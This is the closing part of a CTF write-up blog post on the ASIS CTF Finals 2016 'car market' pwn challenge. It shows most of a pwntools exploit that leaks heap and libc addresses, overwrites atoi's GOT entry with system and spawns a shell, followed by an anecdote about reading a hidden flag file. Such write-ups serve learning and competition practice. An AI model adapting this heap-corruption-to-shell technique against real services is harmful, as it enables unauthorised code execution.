        <span class="n">price</span> <span class="o">=</span> <span class="mi">100</span><span class="o">+</span><span class="n">i</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"add car: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">15</span><span class="p">:</span> <span class="c1"># fake chunk
</span>            <span class="n">model</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
            <span class="n">price</span> <span class="o">=</span> <span class="mh">0x1111</span>
        <span class="n">add_car</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">price</span><span class="p">)</span>

    <span class="c1"># leak heap base
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking heap base..."</span><span class="p">)</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">leak_heap</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>

    <span class="c1"># overflow one byte of heap address
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overflowing heap address..."</span><span class="p">)</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">]</span>
    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"comment"</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">33</span><span class="p">]</span>
    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
    
    <span class="c1"># add comment and overwrite customer pointer, change it to atoi@got.plt
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for leaking got)..."</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># add customer
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span> <span class="c1"># add comment
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># exit customer menu
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c1"># exit select car menu
</span>    
    <span class="c1"># leak atoi's got
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"leaking atoi's got &amp; libc base..."</span><span class="p">)</span>
    <span class="n">leak_got</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
    <span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>

    <span class="c1"># overwrite customer pointer to heap_base+0x10
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car 15 struct (for corrupting car array)..."</span><span class="p">)</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x1111</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)]</span>
    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c1"># exit select car menu
</span>
    <span class="c1"># free &amp; reallocate heap_base+0x10 , now we can control the car array 
</span>    <span class="c1"># after we control the car array, overite car[14] and make it point to atoi's got
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"modifying car array..."</span><span class="p">)</span>
    <span class="n">choice</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">]</span>
    <span class="n">data</span>   <span class="o">=</span> <span class="p">[</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">])]</span>
    <span class="n">sel_car_cust</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="nb">zip</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span> <span class="n">data</span><span class="p">))</span>   
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span> <span class="c1"># exit select car menu
</span>    
    <span class="c1"># overwrite atoi's got
</span>    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"overwriting atoi's got..."</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span> <span class="c1"># select car
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"14"</span><span class="p">)</span> <span class="c1"># input index
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span> <span class="c1"># set model (atoi's got)
</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"model</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell !"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>After I finished the exploit, I found it once again, the exploit has timeout due to the crappy internet connection. So I upload the exploit to trello and ask <strong>freetsubasa</strong> if she can send the payload for me. And then she told me that <strong>she had the shell spawned, but she can’t find the flag.</strong> What ?</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>$ ls -la
total 40
drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
</pre></td></tr></tbody></table></code></div></div>
<p>OK, so the ASIS organizer try to play some trick on us. It’s alright, no big deal, just give us the flag so we can pass the challenge.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ cat ._flag
cat: ._flag: No such file or directory
</pre></td></tr></tbody></table></code></div></div>
<p>WHAT. THE. F*CK.</p>

<p>How is this even possible? The file is just right there and now you’re telling me the file does not exist? This is bullsh*t !@#$%^&amp;</p>

<p>So after we have the shell, we spent another 30 minutes trying to figure out how to read the god damn flag. After some trial &amp; error, teammate <strong>ddaa</strong> finally get the flag by using the <code class="language-plaintext highlighter-rouge">cat .*</code> command. It’s strange because I’ve tried <code class="language-plaintext highlighter-rouge">for f in .*;do cat $f;done</code> and it failed, don’t know why <strong>:/</strong></p>

<p>Anyway we finally got the flag and the 177 points. The binary itself was a great challenge, but the command line one was kind of evil <strong>-.-</strong></p>

<p>flag: <code class="language-plaintext highlighter-rouge">ASIS{a0b8813fc566836c8b5f37fe68c684c5}</code></p>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/write-ups/'>write-ups</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/ctf/"
            class="post-tag no-text-decoration" >CTF</a>
          
          <a href="/tags/pwnable/"
            class="post-tag no-text-decoration" >Pwnable</a>
          
          <a href="/tags/asis/"
            class="post-tag no-text-decoration" >ASIS</a>
          
          <a href="/tags/python/"
            class="post-tag no-text-decoration" >Python</a>
          
          <a href="/tags/use-after-free/"
            class="post-tag no-text-decoration" >use_after_free</a>
          
          <a href="/tags/heap/"
            class="post-tag no-text-decoration" >heap</a>
          
          <a href="/tags/off-by-one/"
            class="post-tag no-text-decoration" >off-by-one</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=ASIS CTF Finals 2016 -- car market - Hacking Tube 2.0&url=http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=ASIS CTF Finals 2016 -- car market - Hacking Tube 2.0&u=http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/" data-toggle="tooltip" data-placement="top"
          title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin">
          <i class="fa-fw fab fa-linkedin"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/Migrate-to-Github-Pages/">Migrate to Github Pages</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Old-School/">MeePwn CTF 2017 -- Old School</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-anotherarena/">MeePwn CTF 2017 -- anotherarena</a></li>
      
        
        
        
        <li><a href="/MeePwn-CTF-2017-Brainfuck-1-2/">MeePwn CTF 2017 -- Brainfuck 1 & 2</a></li>
      
        
        
        
        <li><a href="/csaw-ctf-2014-exploitation-200-pybabbies/">CSAW CTF 2014 -- Exploitation 200 pybabbies</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag" href="/tags/python/">Python</a>
      
        
        <a class="post-tag" href="/tags/pwnable/">Pwnable</a>
      
        
        <a class="post-tag" href="/tags/ppc/">PPC</a>
      
        
        <a class="post-tag" href="/tags/heap/">heap</a>
      
        
        <a class="post-tag" href="/tags/reversing/">Reversing</a>
      
        
        <a class="post-tag" href="/tags/asis/">ASIS</a>
      
        
        <a class="post-tag" href="/tags/c/">C</a>
      
        
        <a class="post-tag" href="/tags/format-string/">format_string</a>
      
        
        <a class="post-tag" href="/tags/33c3/">33C3</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/869100/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Sep 13, 2016
  

  <i class="unloaded">2016-09-13T23:32:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>ASIS CTF Finals 2016 -- shadow</h3>
            <div class="text-muted small">
              <p>
                





                Category: pwn
Points: 99



32 bit ELF, with no NX, PIE, RELRO protection. The program will first use mmap to allocate a range of memory and treat it as a shadow stack, which stores the function re...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/hitcon-ctf-2016-quals-secret-holder/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Oct 10, 2016
  

  <i class="unloaded">2016-10-10T16:10:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>HITCON CTF 2016 Quals -- Secret Holder</h3>
            <div class="text-muted small">
              <p>
                





                Category: pwn
Points: 100



I did not finish the challenge during the contest, but was able to solve it after the game. Damn if only I can fuzz some more…

64 bit ELF,  with Partial RELRO, canary ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/seccon-ctf-2016-chat/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Dec 12, 2016
  

  <i class="unloaded">2016-12-12T16:03:00+08:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SECCON CTF 2016 -- chat</h3>
            <div class="text-muted small">
              <p>
                





                Category: Exploit
Points: 500



64 bit ELF with Partial RELRO, stack canary &amp; NX enabled, No PIE.

The program is a simple tweet-chat service:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
2...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/mma-2nd-ctf-2016-interpreter/" class="btn btn-outline-primary"
    prompt="Older">
    <p>MMA 2nd CTF 2016 -- Interpreter</p>
  </a>
  

  
  <a href="/869100/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>ASIS CTF Finals 2016 -- shadow</p>
  </a>
  

</div>


    
      <!--
  The Disqus lazy loading.
  Powered by: <https://github.com/osvaldasvalutis/disqusLoader.js>
-->

<div id="disqus" class="pt-2 pb-2">
  <p class="text-center text-muted small pb-5">
    Comments powered by <a href="https://disqus.com/">Disqus</a>.
  </p>
</div>

<script src="/assets/js/lib/jquery.disqusloader.min.js"></script>
<script>
  const options = {
    scriptUrl: '//bruce30262logdown.disqus.com/embed.js',

    disqusConfig: function() {
      this.page.title = 'ASIS CTF Finals 2016 -- car market';
      this.page.url = 'http://0.0.0.0:4000/asis-ctf-finals-2016-car-market/';
      this.page.identifier = '/asis-ctf-finals-2016-car-market/';
    }
  };

  $.disqusLoader('#disqus', options);
</script>

    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2021
        <a href="https://twitter.com/bruce30262">Bruce Chen</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
